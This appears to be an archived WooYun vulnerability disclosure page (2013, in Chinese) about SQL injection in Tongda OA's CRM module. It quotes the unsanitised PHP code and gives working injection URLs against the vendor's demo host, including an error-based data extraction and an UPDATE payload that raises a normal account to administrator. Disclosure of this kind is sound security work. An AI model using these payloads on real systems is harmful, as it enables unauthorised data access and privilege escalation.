@@ -1,0 +1,210 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		通达OA一个SQL注射漏洞（需登录）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		通达OA一个SQL注射漏洞（需登录）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/applychen">applychen</a> 
+</li><li>提交时间：		2013-10-28 17:41</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-10-28：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-11-02：	厂商主动忽略漏洞，细节向第三方安全合作伙伴开放<br/>
+									2014-01-23：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">通达OA SQL注射漏洞，需登录。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">程序是集成化安装，在php.ini中register_globals设置为on，允许注册全局变量。<br />
+<br />
+在/general/crm/apps/crm/include/deleteView.php文件中$id变量未初始化：<br />
+<br />
+</p><pre><code>include_once( &quot;general/crm/studio/header.php&quot; );<br />
+include_once( &quot;inc/utility.php&quot; );<br />
+$flag = 0;<br />
+$query = &quot;delete from crm_sys_list_view where id=&quot;.$id;<br />
+$cursor = exequery( $connection, $query );</code></pre><p class='detail'><br />
+<br />
+测试语句如下：<br />
+<br />
+</p><pre><code>http://oa.tongda2000.com:81/general/crm/apps/crm/include/deleteView.php?id=1 and (select 1 from (select count(*),concat((select user()),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/28165253e97da98318c69e9575b19ce25d921077.png" target="_blank"><img src="../images/28165253e97da98318c69e9575b19ce25d921077.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+在/general/crm/apps/crm/include/delete_submit.php中<br />
+<br />
+</p><pre><code>ob_end_clean( );<br />
+$ATTACHMENT_ID = $_POST[&#039;ATTACH_ID&#039;];<br />
+$ATTACHMENT_NAME = $_POST[&#039;ATTACH_NAME&#039;];<br />
+$ENTITY_NAME = $_POST[&#039;ENTITY_NAME&#039;];<br />
+$FIELD_NAME = $_POST[&#039;FIELD_NAME&#039;];<br />
+$KEY_ID = $_POST[&#039;KEY_ID&#039;];<br />
+$ATTACH_TYPE = $_POST[&#039;ATTACH_TYPE&#039;];<br />
+$query = &quot;select &quot;.$FIELD_NAME.&quot;,&quot;.$FIELD_NAME.&quot;_text from &quot;.$ENTITY_NAME.&quot; where id =&#039;&quot;.$KEY_ID.&quot;&#039;&quot;;<br />
+$cursor = exequery( $connection, $query );</code></pre><p class='detail'><br />
+<br />
+$ENTITY_NAME、$FIELD_NAME、$ENTITY_NAME都未进行过滤可以注射SQL语句。<br />
+<br />
+</p><p class="detail"><a href="../images/28171517b7e208bf153b06e7deefc073443940fc.png" target="_blank"><img src="../images/28171517b7e208bf153b06e7deefc073443940fc.png" alt="3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+在/general/crm/modules/Account/account/DeleteView/index.php文件中：<br />
+<br />
+</p><pre><code>include_once( &quot;general/crm/apps/crm/header.php&quot; );<br />
+$entity = $_GET[&#039;entity&#039;];<br />
+$ids = $_GET[&#039;ids&#039;];<br />
+$query = &quot;update &quot;.$entity.&quot; set &quot;.$entity.( &quot;.deleted = 1 where find_in_set(id, &#039;&quot;.$ids.&quot;&#039;)&quot; );<br />
+$cursor = exequery( $connection, $query );</code></pre><p class='detail'><br />
+<br />
+$entity变量未初始化，导致能够更新数据库内的任意表，这里使用的是一般权限账号chr登录。<br />
+<br />
+</p><p class="detail"><a href="../images/281722412556b0036e930ad3a3e826a70e967b05.png" target="_blank"><img src="../images/281722412556b0036e930ad3a3e826a70e967b05.png" alt="4.png" width="600"/></a></p><p class="detail"><br />
+<br />
+下面将chr update为管理员权限。<br />
+<br />
+</p><pre><code>http://oa.tongda2000.com:81/general/crm/modules/Account/account/DeleteView/index.php?entity=user set USER_PRIV=1 where user_id=0x636872%23</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/28173128b6d3327da1ae8cb1a6bb2c888ae63c72.png" target="_blank"><img src="../images/28173128b6d3327da1ae8cb1a6bb2c888ae63c72.png" alt="5.png" width="600"/></a></p><p class="detail"> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">同上 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">初始化并过滤变量 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/applychen" title="applychen">applychen</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-041302" title="通达OA一个SQL注射漏洞（需登录）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2013-11-02 17:42</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="41302";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
